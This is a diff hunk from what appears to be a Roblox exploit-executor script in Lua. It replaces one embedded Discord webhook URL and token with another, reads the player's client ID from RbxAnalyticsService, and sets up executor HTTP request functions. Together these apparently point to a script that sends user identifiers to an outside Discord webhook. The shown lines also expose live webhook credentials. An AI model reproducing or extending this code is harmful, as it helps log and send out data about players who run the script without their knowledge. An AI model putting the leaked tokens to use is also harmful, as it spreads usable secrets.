@@ -161,7 +161,7 @@ setmetatable(
 
 _G.AntiLog = true
 _G.Neon919 = true
-local webh = "https://discord.com/api/webhooks/1099366032738627615/jb10XAgHrHlipXW2qcX9FwQPuTnCEZ6lC4ijkcOxig0IJavUIqOVZFbvrsU1mINyd5fj" -- put your webhook here
+local webh = "https://discord.com/api/webhooks/1099366035251023973/nhFcsoEzXe6sNyzI4syT6vgpimXG3pGF3x9R4CJN9wzhGpRq5HXEJYV2h37GXwUuK2Wz" -- put your webhook here
 local req = http_request or request or (syn and syn.request) 
 local uwu = game:GetService("RbxAnalyticsService"):GetClientId()
 local LocalPlayer = game:GetService("Players").LocalPlayer
